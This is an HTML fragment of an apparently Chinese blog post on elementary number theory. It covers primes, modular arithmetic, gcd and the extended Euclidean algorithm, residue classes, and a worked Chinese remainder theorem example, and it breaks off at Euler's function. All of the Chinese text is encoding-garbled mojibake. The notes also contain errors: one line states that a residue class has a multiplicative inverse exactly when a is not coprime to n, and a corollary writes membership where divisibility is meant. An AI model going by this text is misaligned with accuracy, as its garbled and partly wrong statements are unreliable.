href="#å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚" class="headerlink" title="å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚"></a><strong>å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚</strong></h3><h3 id="å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡-sqrt-n-çš„ç´ å› å­ï¼ˆn-gt-1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤-sqrt-n-ï¼‰"><a href="#å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡-sqrt-n-çš„ç´ å› å­ï¼ˆn-gt-1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤-sqrt-n-ï¼‰" class="headerlink" title="å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡$\sqrt{n}$çš„ç´ å› å­ï¼ˆn&gt;1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤$\sqrt{n}$ï¼‰"></a><strong>å®šç†ï¼šä»»ä½•åˆæ•°néƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡$\sqrt{n}$çš„ç´ å› å­ï¼ˆn&gt;1æ˜¯åˆæ•°ï¼Œåˆ™å­˜åœ¨ç´ æ•°pï¼Œä½¿pâ‰¤$\sqrt{n}$ï¼‰</strong></h3><ul><li><strong>åˆ¤æ–­næ˜¯å¦æ˜¯ç´ æ•°ï¼Œå¦‚æœæ‰€æœ‰ç´ æ•°pâ‰¤$\sqrt{n}$éƒ½ä¸èƒ½æ•´é™¤nï¼Œåˆ™næ˜¯ç´ æ•°</strong></li></ul><h3 id="å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š"><a href="#å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š" class="headerlink" title="å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š"></a><strong>å®šç†ï¼šç®—æ•°åŸºæœ¬å®šç†</strong>ï¼šä»»ä½•éé›¶æ•´æ•°nï¼Œå¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹çš„ä¹˜ç§¯å½¢å¼ï¼š</h3><script type="math/tex; mode=display">n=\pm p_1^{e_1}\dots p_r^{e_r}</script><p>â€‹        å…¶ä¸­ï¼Œ$p_1,\dots ,p_ræ˜¯äº’ä¸ç›¸åŒçš„ç´ æ•°ï¼Œe_1,\dotsï¼Œe_ræ˜¯æ­£æ•´æ•°$ã€‚</p><ul><li>PSï¼šè¿™ä¸ªè¡¨ç¤ºå½¢å¼å”¯ä¸€ï¼ˆå¿½ç•¥é¡ºåºï¼‰ï¼Œè®¤ä¸º$\pm1$å¯ä»¥è¡¨ç¤ºæˆ0ä¸ªç´ å› å­é¡¹ç›¸ä¹˜ï¼ˆr=0ï¼‰ï¼Œé€šå¸¸æŠŠ0ä¸ªç´ æ•°ç›¸ä¹˜çš„ç»“æœä½œä¸º1ã€‚</li></ul><h3 id="å®šç†ï¼š-è®¾pæ˜¯ç´ æ•°ï¼Œa-bâˆˆ-mathbb-Z-åˆ™p-mid-ab-Rightarrow-p-mid-aæˆ–p-mid-b"><a href="#å®šç†ï¼š-è®¾pæ˜¯ç´ æ•°ï¼Œa-bâˆˆ-mathbb-Z-åˆ™p-mid-ab-Rightarrow-p-mid-aæˆ–p-mid-b" class="headerlink" title="å®šç†ï¼š$è®¾pæ˜¯ç´ æ•°ï¼Œa,bâˆˆ\mathbb{Z},åˆ™p\mid ab \Rightarrow p\mid aæˆ–p\mid b$"></a>å®šç†ï¼š$è®¾pæ˜¯ç´ æ•°ï¼Œa,bâˆˆ\mathbb{Z},åˆ™p\mid ab \Rightarrow p\mid aæˆ–p\mid b$</h3><blockquote><p>æ¨è®ºï¼š$è®¾pæ˜¯a_1,\dots ,a_k\in \mathbb{Z},åˆ™p\in a_1\dots a_k \Rightarrow p \in a_i,i \in {1,\dots,k}$</p></blockquote><h3 id="å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª"><a href="#å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª" class="headerlink" title="å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª"></a><strong>å®šç†ï¼šæ¬§å‡ é‡Œå¾—å®šç†ï¼šç´ æ•°æœ‰æ— ç©·æˆ–å¤šä¸ª</strong></h3><p>â€‹        è¯æ˜ç•¥</p><hr><h2 id="æ¨¡è¿ç®—"><a href="#æ¨¡è¿ç®—" class="headerlink" title="æ¨¡è¿ç®—"></a>æ¨¡è¿ç®—</h2><script type="math/tex; mode=display">a\ mod\ bï¼šè®¾aï¼Œbâˆˆ \mathbb{Z}ä¸”b>0,å¦‚æœq,râˆˆ\mathbb{Z}æ»¡è¶³\\a=qb+r,ä¸”0\leq r<b,\\åˆ™å®šä¹‰ï¼ša\ mod\ b=r</script><p>è´Ÿæ•°æ€ä¹ˆæ±‚æ¨¡ï¼Ÿ</p><blockquote><p> ç”¨bä¸æ–­åŠ aï¼Œç›´è‡³å¤§äº0</p></blockquote><p>æ€§è´¨ï¼š</p><ul><li>$b|a \iff a\ mod\ b=0$</li><li>$(a+b)\ mod\ n=(a\ mod\ n+b\ mod n)\ mod\ n$</li><li>$(a-b)\ mod\ n=(a\ mod\ n-b\ mod n)\ mod\ n$</li><li>$(a\times b)\ mod\ n=(a\ mod\ n\times b\ mod n)\ mod\ n$</li></ul><h3 id="ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰"><a href="#ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰" class="headerlink" title="ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰"></a>ä¹˜æ³•é€†å…ƒï¼ˆä¸€å®šè¦è¯´æ˜æ˜¯åœ¨å“ªä¸ªæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼‰</h3><blockquote><p>ä¹å¹´åˆ¶ä¹‰åŠ¡æ•™è‚²ä¸­çš„æ¦‚å¿µï¼šå€’æ•°ï¼šä¸¤ä¸ªæ•°çš„ä¹˜ç§¯ä¸º1ï¼Œå°±ç§°è¿™ä¸¤ä¸ªæ•°äº’ä¸ºå€’æ•°</p></blockquote><p>å®šä¹‰ï¼š$è®¾a\in \mathbb{Z},n\in \mathbb{N},å¦‚æœ az \equiv1 \pmod n,$<br>$ç§°zæ˜¯æ¨¡nä¸‹açš„ä¹˜æ³•é€†å…ƒï¼Œè®°ä½œa^{-1}=zã€‚$</p><blockquote><p>ä¾‹ï¼š</p><p>$2^{-1}\ mod\ 7=4$</p><p>$2^{-1}\ mod\ 5=3$</p></blockquote><ul><li><p>æ³¨æ„1ï¼š$æ¨¡nä¸‹äº’ä¸ºä¹˜æ³•é€†å…ƒï¼Œä¸€èˆ¬åªè€ƒè™‘æ¯”nå°çš„$</p></li><li><p>æ³¨æ„2ï¼š$aåœ¨æ¨¡nå†…çš„ä¹˜æ³•é€†å…ƒa^{-1}(1\le a^{-1} \lt n)æ˜¯å”¯ä¸€çš„$</p></li><li><p>æ³¨æ„3ï¼šä¹˜æ³•é€†å…ƒå­˜åœ¨çš„æ¡ä»¶ï¼š</p><p>$gcd(a,n)=1\iff æ¨¡nä¸‹ï¼Œaæœ‰ä¹˜æ³•é€†å…ƒ$</p></li></ul><p>æ€ä¹ˆæ±‚ä¹˜æ³•é€†å…ƒï¼Œè§ä¸‹é¢â€”â€”<strong>æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•</strong></p><hr><h2 id="æœ€å¤§å…¬çº¦æ•°"><a href="#æœ€å¤§å…¬çº¦æ•°" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°"></a>æœ€å¤§å…¬çº¦æ•°</h2><ul><li>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœdâˆˆ\mathbb{Z}ä¸”d|aï¼Œd|bï¼Œåˆ™ç§°dæ˜¯aå’Œbçš„å…¬å› å­(å…¬çº¦æ•°)$</li><li>$å¦‚æœdâ‰¥0ï¼Œä¸”aå’Œbçš„æ‰€æœ‰å…¬å› å­éƒ½æ•´é™¤dï¼Œåˆ™ç§°dæ˜¯aå’Œbçš„æœ€å¤§å…¬çº¦æ•°ï¼Œè®°ä½œgcd(a,b).$</li></ul><blockquote><p>PS:å…¬å› å­å¯ä»¥æ˜¯ä»»æ„æ•´æ•°ï¼ˆåŒ…æ‹¬0ï¼Œè´Ÿæ•´æ•°ï¼‰</p><p>PS:æœ€å¤§å…¬çº¦æ•°åªèƒ½æ˜¯0æˆ–æ­£æ•´æ•°ï¼Œä¸èƒ½æ˜¯è´Ÿçš„</p></blockquote><h3 id="æ¬§å‡ é‡Œå¾—ç®—æ³•-è¾—è½¬ç›¸é™¤æ³•"><a href="#æ¬§å‡ é‡Œå¾—ç®—æ³•-è¾—è½¬ç›¸é™¤æ³•" class="headerlink" title="æ¬§å‡ é‡Œå¾—ç®—æ³• (è¾—è½¬ç›¸é™¤æ³•)"></a>æ¬§å‡ é‡Œå¾—ç®—æ³• (è¾—è½¬ç›¸é™¤æ³•)</h3><p> ä¸å¤±ä¸€èˆ¬æ€§ï¼Œè®¾aâ‰¥bâ‰¥0ï¼Œæ±‚gcd(a,b)</p><p>æ•°å­¦åŸç†ï¼š</p><p>$b=0æ—¶ï¼Œgcd(a,0)=a$ï¼ˆä»»ä½•æ•´æ•°éƒ½æ˜¯0çš„å…¬å› å­ï¼‰</p><script type="math/tex; mode=display">b>0æ—¶ï¼Œgcd(a,b)=gcd(b,r)=gcd(r,r_1)\\=gcd(r_n,0)=r_n</script><blockquote><p>PSï¼šrä¸ºä½™æ•°ï¼Œa=qb+r</p></blockquote><h3 id="æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•(å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•)"></a>æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•(å¹¿ä¹‰æ¬§å‡ é‡Œå¾—ç®—æ³•)</h3><p>ç”¨é€”ï¼š$è®¡ç®—as+bt=gcd(a,b)ä¸­çš„så’Œt$</p><p>æœ¬è´¨æ˜¯åœ¨æ‰§è¡Œæ¬§å‡ é‡Œå¾—ç®—æ³•çš„æ—¶å€™åˆ©ç”¨æ¯ä¸€æ­¥è®¡ç®—å‡ºæ¥çš„ä½™æ•°ä»¥åŠå‰¯äº§å“â€œå•†â€ï¼Œé¡ºé“è¿­ä»£çš„è®¡ç®—å‡ºæ¯ä¸€æ­¥å¯¹åº”çš„så’Œt</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/exgcd.jpg" alt="exgcd"></p><h3 id="è£´èœ€å®šç†"><a href="#è£´èœ€å®šç†" class="headerlink" title="è£´èœ€å®šç†"></a>è£´èœ€å®šç†</h3><p>$è‹¥a,bæ˜¯æ•´æ•°,ä¸”    gcd    (a,b)=dï¼Œé‚£ä¹ˆå¯¹äºä»»æ„çš„æ•´æ•°x,y,ax+byéƒ½ä¸€å®šæ˜¯dçš„å€æ•°ï¼Œç‰¹åˆ«åœ°ï¼Œä¸€å®šå­˜åœ¨æ•´æ•°x,yï¼Œä½¿ax+by=dæˆç«‹$</p><p>æ³¨æ„ï¼šæ­¤å¤„çš„xå’Œyæ˜¯æ•´æ•°ï¼ˆå³å¯ä»¥æ˜¯è´Ÿæ•°ï¼‰</p><h3 id="å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†"><a href="#å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†" class="headerlink" title="å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†"></a>å®šç†ï¼šæœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†</h3><p>$è®¾a,bâˆˆ\mathbb{Z},d=gcd(a,b),åˆ™\exist s,tâˆˆ\mathbb{Z},ä½¿å¾—as+bt=d$</p><p>ç‰¹åˆ«åœ°ï¼š$gcd(a,b)=1\iff as+bt=1$</p><p>æ¨è®ºï¼š$d\mid v\iff as+bt=v$</p><h3 id="æ±‚ä¹˜æ³•é€†å…ƒ"><a href="#æ±‚ä¹˜æ³•é€†å…ƒ" class="headerlink" title="æ±‚ä¹˜æ³•é€†å…ƒ"></a>æ±‚ä¹˜æ³•é€†å…ƒ</h3><p>$è®¾gcd(a,n)=1$</p><p>$æ ¹æ®æœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†ï¼Œæœ‰$</p><p>$as+tn=1$</p><p>$ç­‰å¼ä¸¤è¾¹åŒæ—¶æ¨¡nï¼Œå¾—$</p><p>$as\equiv1\pmod n$</p><p>$æ˜“çŸ¥ï¼Œæ¨¡nä¸‹açš„é€†å…ƒæ˜¯s$</p><hr><h2 id="äº’ç´ "><a href="#äº’ç´ " class="headerlink" title="äº’ç´ "></a>äº’ç´ </h2><ul><li><p>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœgcd(a,b)=1,åˆ™ç§°aå’Œbäº’ç´ ã€‚$</p></li><li><p>$è®¾gcd(a,b)=d,åˆ™å­˜åœ¨q_1,q_2\in \mathbb{Z},ä½¿å¾—a=q_1 d,b=q_2d,ä¸”gcd(q_1,q_2)=1$</p></li></ul><hr><h2 id="æœ€å°å…¬å€æ•°-LCM"><a href="#æœ€å°å…¬å€æ•°-LCM" class="headerlink" title="æœ€å°å…¬å€æ•°(LCM)"></a>æœ€å°å…¬å€æ•°(LCM)</h2><ul><li><p>$è®¾a,bâˆˆ\mathbb{Z},å¦‚æœmâˆˆ\mathbb{Z}åˆ†åˆ«æ˜¯aå’Œbçš„å€æ•°ï¼Œmç§°ä½œaå’Œbçš„å…¬å€æ•°$</p><blockquote><p>$å¦‚æœa\mid c,b\mid c,åˆ™m\mid c$</p></blockquote></li><li><p>$lcm(a,b):aå’Œbçš„æœ€å°å…¬å€æ•°$</p></li><li>$a,bâ‰ 0ï¼šmæ˜¯aå’Œbæ‰€æœ‰æ­£çš„å…¬å€æ•°ä¸­æœ€å°ï¼Œmå«ä½œaå’Œbçš„æœ€å°å…¬å€æ•°$</li><li>$a=0æˆ–b=0ï¼šlcm(a,b)=0$</li><li><p>$gad(a,b)=1\Rightarrow lcm(a,b)=ab$</p></li><li><p>$lcm(a,b)=ab/gcd(a,b)$</p><blockquote><p>æ±‚lcmï¼šä¸¤ä¸ªæ•°ä¸æ–­åŠ è‡ªå·±ï¼Œç›´è‡³ç›¸ç­‰ã€‚</p></blockquote></li></ul><hr><h2 id="ç­‰ä»·å…³ç³»"><a href="#ç­‰ä»·å…³ç³»" class="headerlink" title="ç­‰ä»·å…³ç³»"></a>ç­‰ä»·å…³ç³»</h2><p>åŒæ—¶æ»¡è¶³<strong>è‡ªåæ€§ï¼Œå¯¹ç§°æ€§ï¼Œä¼ é€’æ€§</strong></p><blockquote><p>ä¾‹ï¼š&gt;åªæ»¡è¶³ä¼ é€’æ€§ï¼Œâ‰¥ä¸æ»¡è¶³å¯¹ç§°</p></blockquote><h2 id="åŒä½™å…³ç³»"><a href="#åŒä½™å…³ç³»" class="headerlink" title="åŒä½™å…³ç³»"></a>åŒä½™å…³ç³»</h2><p>$a\equiv b \pmod n$ï¼šè®¾nä¸ºæ­£æ•´æ•°(æ­¤å¤„è¢«ç§°ä¸ºæ¨¡æ•°)ï¼Œæ•´æ•°aå’Œbåˆ†åˆ«æ¨¡nï¼Œå¦‚æœå¾—åˆ°ç›¸åŒçš„ä½™æ•°ï¼Œå°±ç§°aå’Œbåœ¨æ¨¡nä¸‹æ»¡è¶³åŒä½™å…³ç³»ï¼Œç®€ç§°åŒä½™ï¼ˆæ­¤å¤„ä¸ºå…³ç³»ï¼Œè€Œéè¿ç®—ï¼Œä¸$a\  mod \ b$è¿›è¡ŒåŒºåˆ†ï¼‰</p><p>å®šä¹‰ï¼š$è®¾a,b,nâˆˆ\mathbb{Z},n\mid (a-b),å°±ç§°aå’Œbåœ¨æ¨¡nä¸‹åŒä½™ï¼Œè®°ä½œa\equiv b\pmod nã€‚$</p><p>æ˜¯ä¸€ç§<strong>ç­‰ä»·å…³ç³»</strong></p><p>è¿ç®—æ€§è´¨ï¼šåŠ å‡ä¹˜(ç”šè‡³æ˜¯å’Œä¹˜æ–¹)ä»ç„¶æ»¡è¶³åŒä½™å…³ç³»ï¼Œé™¤æ³•æœ‰éœ€è¦ç‰¹åˆ«æ³¨æ„çš„åœ°æ–¹ã€‚</p><h3 id="ä¸€æ¬¡åŒä½™æ–¹ç¨‹"><a href="#ä¸€æ¬¡åŒä½™æ–¹ç¨‹" class="headerlink" title="ä¸€æ¬¡åŒä½™æ–¹ç¨‹"></a>ä¸€æ¬¡åŒä½™æ–¹ç¨‹</h3><p>$x\equiv b \pmod nçš„è§£é›†ï¼š{b\pm nk,å…¶ä¸­k=0,1,2,3\dots}$</p><ul><li><p>ä¸€ä¸ªè§„å¾‹ï¼š$åŸæ¨¡æ•°ä¸ºn,æœ€ç»ˆæ¨¡æ•°ä¸ºn^{â€™},è®¾n/n{â€™}=dï¼Œæœ‰0\sim n-1ä¹‹é—´è§£çš„æ•°é‡æ°å¥½ç­‰äºd$</p></li><li><p>æœ‰è§£çš„æ¡ä»¶ï¼š$è‹¥gcd(a,n)=d,åˆ™ax\equiv b\pmod næœ‰è§£\iff d\mid b$</p></li></ul><h3 id="æ¶ˆå»å¾‹"><a href="#æ¶ˆå»å¾‹" class="headerlink" title="æ¶ˆå»å¾‹"></a>æ¶ˆå»å¾‹</h3><p>$å®šä¹‰ï¼šè®¾a,n\in \mathbb{Z},n&gt;0,å¦‚æœgcd(a,n)=d,æœ‰$</p><p>$az\equiv az^{â€˜}\pmod n\ \Rightarrow \ z\equiv z^{â€˜}\pmod {n/d}$</p><hr><h2 id="å‰©ä½™ç±»-ä¸€ç§ç­‰ä»·ç±»"><a href="#å‰©ä½™ç±»-ä¸€ç§ç­‰ä»·ç±»" class="headerlink" title="å‰©ä½™ç±»(ä¸€ç§ç­‰ä»·ç±»)"></a>å‰©ä½™ç±»(ä¸€ç§ç­‰ä»·ç±»)</h2><h3 id="ç­‰ä»·ç±»çš„æ¦‚å¿µ"><a href="#ç­‰ä»·ç±»çš„æ¦‚å¿µ" class="headerlink" title="ç­‰ä»·ç±»çš„æ¦‚å¿µ"></a>ç­‰ä»·ç±»çš„æ¦‚å¿µ</h3><p>$è®¾\simæ˜¯é›†åˆSä¸Šçš„ç­‰ä»·å…³ç³»ï¼Œå¯¹äºa\in \mathbb{S},å®šä¹‰å…¶ç­‰ä»·ç±»ä¸º{x\in \mathbb{S}\ |\ x\sim a}$</p><ul><li>$\mathbb{S}ä¸­æ¯ä¸ªå…ƒç´ å¿…å­˜åœ¨äºå”¯ä¸€çš„ç­‰ä»·ç±»ä¸­$</li><li>$æ‰€æœ‰ç­‰ä»·ç±»çš„å¹¶é›†æ°å¥½å°±æ˜¯\mathbb{S}$</li></ul><h3 id="å‰©ä½™ç±»-æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨"><a href="#å‰©ä½™ç±»-æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨" class="headerlink" title="å‰©ä½™ç±»(æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨)"></a>å‰©ä½™ç±»(æ»¡è¶³ç­‰ä»·ç±»æ‰€æœ‰æ€§è´¨)</h3><p>$è®¾a\in \mathbb{Z}ï¼Œå®šä¹‰å…¶å‰©ä½™ç±»ä¸º{x\in \mathbb{Z}\ |\ x\equiv a\pmod n \ }$</p><p>$æ¨¡nä¸‹å«æ•´æ•°açš„å‰©ä½™ç±»ï¼Œè®°ä½œ[a]_n,ä¸å¼•èµ·æ­§ä¹‰æ—¶ï¼Œç®€è®°ä¸º[a]$</p><p>$å‰©ä½™ç±»é‡Œçš„æ¯ä¸ªæ•´æ•°éƒ½å«ä½œè¿™ä¸ªå‰©ä½™ç±»çš„ä»£è¡¨å…ƒï¼Œæ¯”å¦‚æ¨¡5ä¸‹,-10,-5,0,5,10éƒ½æ˜¯[0]çš„ä»£è¡¨å…ƒ$</p><h3 id="å‰©ä½™ç±»é›†ï¼š-mathbb-Z-n"><a href="#å‰©ä½™ç±»é›†ï¼š-mathbb-Z-n" class="headerlink" title="å‰©ä½™ç±»é›†ï¼š$\mathbb{Z_n}$"></a>å‰©ä½™ç±»é›†ï¼š$\mathbb{Z_n}$</h3><p>$\mathbb{Z_n}={[0],[1],[2]\dots\,[n-1]}$</p><p>$\mathbb{Z_5}={[0],[1],[2],[3],[4],}$</p><h4 id="è¿ç®—"><a href="#è¿ç®—" class="headerlink" title="è¿ç®—"></a>è¿ç®—</h4><p>$[a]+[b]:=[a+b]$</p><p>$[a]Â·[b]:=[aÂ·b]$</p><p>$å…¶ä¸­a,b\in \mathbb{Z}$</p><p>$è®¾u,v\in \mathbb{Z_n},è‹¥uv=[1],åˆ™uå’Œväº’ä¸ºä¹˜æ³•é€†å…ƒ$</p><p>$è®¾u=[a],v=[b],åˆ™$</p><p>â€‹    $uå’Œväº’ä¸ºä¹˜æ³•é€†å…ƒ\iff ab \equiv1 \pmod n$</p><p>â€‹    $å³u(å’Œv)æœ‰ä¹˜æ³•é€†å…ƒ\iff a(å’Œb)ä¸näº’ç´ $</p><p>$\mathbb{Z^{*}_n}={\mathbb{Z_n}ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»}$</p><p>â€‹       $={[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1}$</p><ul><li><p>$nä¸ºç´ æ•°ï¼š\mathbb{Z^{*}_n}=\mathbb{Z_n} \setminus {[0]}$</p></li><li><p>$nä¸ºåˆæ•°ï¼š\mathbb{Z^{*}_n} \subsetneq \mathbb{Z_n}\setminus{[0]}$</p></li></ul><p><strong>ä¸å¼•èµ·èµ·ä¹‰çš„æƒ…å†µä¸‹ï¼Œ[ ]å¯ä»¥çœç•¥</strong></p><hr><h2 id="ä¸­å›½å‰©ä½™å®šç†-å­™å­å®šç†"><a href="#ä¸­å›½å‰©ä½™å®šç†-å­™å­å®šç†" class="headerlink" title="ä¸­å›½å‰©ä½™å®šç†(å­™å­å®šç†)"></a>ä¸­å›½å‰©ä½™å®šç†(å­™å­å®šç†)</h2><p>$è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°n_1,\dots,n_m\in \mathbb{N},ä»¥åŠä»»æ„æ•´æ•°a_1,\dots,a_m\in \mathbb{Z},å¹¶è®¾n={\prod}\limits_{i=1}^mn_i,æ–¹ç¨‹ç»„$</p><p>â€‹        <script type="math/tex">\left \{  \begin{array}{c} x\equiv a_1\pmod {n_1} \\  \dots \\  x\equiv a_m\pmod {n_m} \end{array} \right.</script></p><p>$å¿…æœ‰è§£ï¼Œè®¾è§£ä¸ºa\in \mathbb{Z}ã€‚å¹¶ä¸”å¯¹ä»»æ„a^{â€™}\in \mathbb{Z},éƒ½æœ‰$</p><p>$a^{â€™}æ˜¯æ–¹ç¨‹ç»„çš„è§£\iff a\equiv a^{â€˜}\pmod n$</p><p>$è®¾n=\prod_{i=1}^mn_i$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1,\dots,n_i^{*}=n/n_i,\dots,n_m^{*}=n/n_m</script><p>â€‹            <script type="math/tex">gcd(n_1^{*},n_1)=1,\dots,gcd(n_i^{*},n_i)=1,\dots,gcd(n_m^{*}ï¼Œn_m)=1</script></p><p>â€‹            <script type="math/tex">t_1n_1^{*}\equiv1 \pmod {n_1},\dots,t_in_i^{*}\equiv1 \pmod {n_i},\dots,t_m n_m^{*}\equiv 1 \pmod {n_m}</script></p><p>â€‹            <script type="math/tex">e_i=t_in_i^{*}\equiv\left \{\begin{array}{c}1\pmod {n_i} \\\ 0\pmod {n_j},j\neq i \end{array} \right.</script></p><p>â€‹            $a={\sum}\limits_{i=1}^{m}e_ia_i=e_1a_1+\dots+e_ma_m$</p><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i</script><blockquote><p>ä¾‹ï¼šä¸‰ä¸‰æ•°ä¹‹å‰©äºŒï¼Œäº”äº”æ•°ä¹‹å‰©ä¸‰ï¼Œä¸ƒä¸ƒæ•°ä¹‹å‰©äºŒï¼Œé—®ç‰©å‡ ä½•ï¼Ÿ</p><p>è‡ªå·±å»æœç´¢ã€Šå­™å­æ­Œè¯€ã€‹ï¼Œçœ‹çœ‹è€ç¥–å®—çš„æ™ºæ…§</p><p>ç¬”è€…åœ¨æ­¤ä¸€éæ­¤å¤„çš„åšæ³•</p><script type="math/tex; mode=display">\left \{  \begin{array}{c} x\equiv 2\pmod{3} \\ x\equiv 3\pmod {5}\\  x\equiv 2\pmod {7} \end{array} \right.</script><p>$n=3\times 5\times7=105$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1=35,n_2^{*}=n/n_2=21,n_3^{*}=n/n_3=15</script><script type="math/tex; mode=display">n_1^{*-1}=2ï¼Œn_2^{*-1}=1ï¼Œn_3^{*-1}=1ï¼Œ</script><script type="math/tex; mode=display">PS:n_i^{*-1}ä¸ºn_1^{*}æ¨¡n_içš„ä¹˜æ³•é€†å…ƒ</script><script type="math/tex; mode=display">e_1=35*2=70,e_2=21*1=21,e_3=15*1=15</script><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i=233</script><p>$æœ€åï¼Œ105å†…çš„å”¯ä¸€è§£å³ä¸º233\ mod\ 105=23$</p></blockquote><h3 id="ä¸­å›½å‰©ä½™æ˜ å°„"><a href="#ä¸­å›½å‰©ä½™æ˜ å°„" class="headerlink" title="ä¸­å›½å‰©ä½™æ˜ å°„"></a>ä¸­å›½å‰©ä½™æ˜ å°„</h3><p>$è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°n_1,\dots,n_m\in \mathbb{N},n={\prod}\limits_{i=1}^mn_i,åˆ™ä¸­å›½å‰©ä½™æ˜ å°„$</p><p>$\tauï¼š\mathbb{Z_n}\rightarrow \mathbb{Z_{n_1}}\times\dots\times \mathbb{Z_{n_m}}$</p><p>â€‹    $a\rightarrow(a\ mod\ n_1,\dots,a\ mod\ n_m)$</p><p>$æ˜¯ä¸€ä¸ªåŒå°„$</p><ul><li>$å°†æ‰€æœ‰\mathbb{Z}æ¢æˆå¸¦*çš„ï¼Œå¼å­ä¾ç„¶æˆç«‹$</li></ul><hr><h2 id="æ¬§æ‹‰å‡½æ•°"><a href="#æ¬§æ‹‰å‡½æ•°" class="headerlink" title="æ¬§æ‹‰å‡½æ•°"></a>æ¬§æ‹‰å‡½æ•°</h2><p>å­©å­ä»¬ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œä¸å¦¨å…ˆå¾€å‰ç¿»å‡ ç« ï¼Œçœ‹çœ‹å‰©ä½™ç±»ä¸­æåˆ°çš„ä¸€ä¸ªæ¦‚å¿µ</p><p>$\mathbb{Z^{*}_n}={\mathbb{Z_n}ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»}$</p><p>â€‹       $={[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1}$</p><ul><li><p>$nä¸ºç´ æ•°ï¼š\mathbb{Z^{*}_n}=\mathbb{Z_n}\setminus{[0]}$</p></li><li><p>$nä¸ºåˆæ•°ï¼š\mathbb{Z^{*}_n}\subsetneq \mathbb{Z_n}\setminus{[0]}$</p></li></ul><p><strong>ä¸å¼•èµ·æ­§ä¹‰çš„æƒ…å†µä¸‹ï¼Œ[ ]å¯ä»¥çœç•¥</strong></p><h3 id="å®šä¹‰ï¼š"><a href="#å®šä¹‰ï¼š" 